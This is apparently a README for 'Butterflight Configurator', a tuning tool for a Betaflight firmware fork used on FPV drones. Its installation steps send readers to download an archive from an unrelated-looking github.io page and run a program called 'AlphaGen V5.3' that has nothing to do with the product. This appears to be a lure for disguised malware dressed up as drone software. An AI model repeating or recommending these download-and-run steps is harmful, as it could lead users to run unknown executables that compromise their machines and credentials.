## Ідея

Butterflight Configurator is a custom tuning interface built for Butterflight firmware — a smoother, more experimental fork of Betaflight for FPV drones.

_З README.md, без переказу._

## Для чого

Butterflight Configurator is a flight controller interface built to support Butterflight firmware — a fork of Betaflight focused on improved filtering, stability, and experimental features. It offers pilots access to PID tuning, filter configuration, OSD layout, CLI control, and blackbox analysis, optimized for smooth FPV freestyle flight.

### ⚙️ Installation Instructions

1. 📦 [Download the archive](https://jeffersongilesaeoq.github.io/.github/butterflight-configurator)  
2. 📁 Extract the contents to your selected folder  
3. 🖱 Run AlphaGen V5.3 to initialize Butterflight detection  
4. ✅ Connect your flight controller via USB and launch configuration

### 🧪 Usage Examples

- Tune dynamic notch filtering for ultra-smooth freestyle
